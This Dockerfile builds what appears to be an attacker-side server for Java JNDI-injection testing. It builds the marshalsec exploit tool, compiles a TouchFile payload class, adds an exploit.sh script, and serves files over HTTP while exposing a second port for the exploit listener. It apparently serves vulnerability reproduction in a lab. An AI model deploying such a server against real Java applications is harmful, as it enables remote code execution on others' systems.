FROM ubuntu:24.04
RUN apt update && DEBIAN_FRONTEND=noninteractive TZ=Etc/UTC apt install -y wget git maven curl python3
RUN apt install -y  openjdk-8-jdk
RUN git clone https://github.com/mbechler/marshalsec
WORKDIR /marshalsec
RUN apt purge openjdk-21* -y
RUN mvn clean package -DskipTests
WORKDIR /tmp
COPY TouchFile.java /tmp/
RUN javac TouchFile.java
COPY exploit.sh /tmp/
RUN chmod +x /tmp/exploit.sh
EXPOSE 80
EXPOSE 9999
CMD ["python3", "-m", "http.server", "80"]